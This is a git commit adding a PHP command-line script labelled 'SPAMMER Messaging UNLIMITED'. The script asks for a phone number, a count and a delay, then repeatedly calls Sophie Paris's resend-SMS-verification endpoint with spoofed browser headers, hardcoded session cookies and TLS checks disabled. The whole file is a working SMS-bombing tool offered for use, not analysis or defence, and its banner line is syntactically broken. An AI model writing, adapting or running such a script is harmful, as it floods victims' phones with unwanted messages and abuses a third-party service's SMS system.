0a65d665f17f40dda9886b7e9528d17efcca03f5
iamexpired <61690352+iamexpired@users.noreply.github.com>
2020-03-02 18:20:14 +0700

    Create exp.php
    /iamexpired.

---
+++ exp.php
@@ -0,0 +1,54 @@
+<?php
+function sophie($nohp, $jum, $wait){
+    $x = 0; 
+    while($x < $jum) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL,"https://www.sophieparis.com/iregistration/index/resendHpValidationCode/");
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS,"hp=".$nohp."");
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+        curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate");
+        curl_setopt($ch, CURLOPT_REFERER, 'https://www.sophieparis.com/iregistration/member/revalidatesms/');
+ $headers = array();
+ $headers[] = "Authority: www.sophieparis.com";
+ $headers[] = "Accept: */*";
+ $headers[] = "X-Newrelic-Id: VQ8HV15WCBABV1RWDgcGUVM=";
+ $headers[] = "Sec-Fetch-Dest: empty";
+ $headers[] = "X-Requested-With: XMLHttpRequest";
+ $headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36";
+ $headers[] = "Content-Type: application/x-www-form-urlencoded; charset=UTF-8";
+ $headers[] = "Origin: https://www.sophieparis.com";
+ $headers[] = "Sec-Fetch-Site: same-origin";
+ $headers[] = "Sec-Fetch-Mode: cors";
+ $headers[] = "Accept-Language: en-US,en;q=0.9";
+ $headers[] = "Cookie: _ga=GA1.3.1653073049.1583108686; _gid=GA1.3.1507369321.1583108686; _hjid=c27f2024-b259-41fa-9ce9-73d8b5571b8f; toky_state=minimized; ins-gaSSId=e59f405d-6429-96d0-9eaf-2b92b66527a9_1583108691; _hjIncludedInSample=1; scarab.visitor=%222EAF352B0D1C530F%22; _fbp=fb.1.1583108698613.1373126036; frontend_cid=pimZ7VtcIRKBM2oi; am_promo_notification=0; frontend=laskgth5m8mkqfhjclgsilv9f0; MGT_NO_CACHE=1; insdrSV=11";
+        
+ curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+ $server_output = curl_exec ($ch);
+ curl_close ($ch);
+ echo $server_output."\n";
+ sleep($wait);
+ $x++;
+ flush();
+    }
+}
+print " Spammer Messaging "
+Codeby : iamexpired.
+
+\n";
+
+echo "SPAMMER Messaging UNLIMITED \n";
+        echo "Phone Number ? ( ex : 08xxx )\nInput : ";
+        $nomor = trim(fgets(STDIN));
+        echo "Jumlah?\nInput : ";
+        $jumlah = trim(fgets(STDIN));
+        echo "Jeda? 0-1000000000 (ex:0)\nInput : ";
+        $jeda = trim(fgets(STDIN));
+        echo "Status :\n";
+        $execute = sophie($nomor, $jumlah, $jeda);
+        print $execute;
+        echo "/iamexpired.\n";
+?>
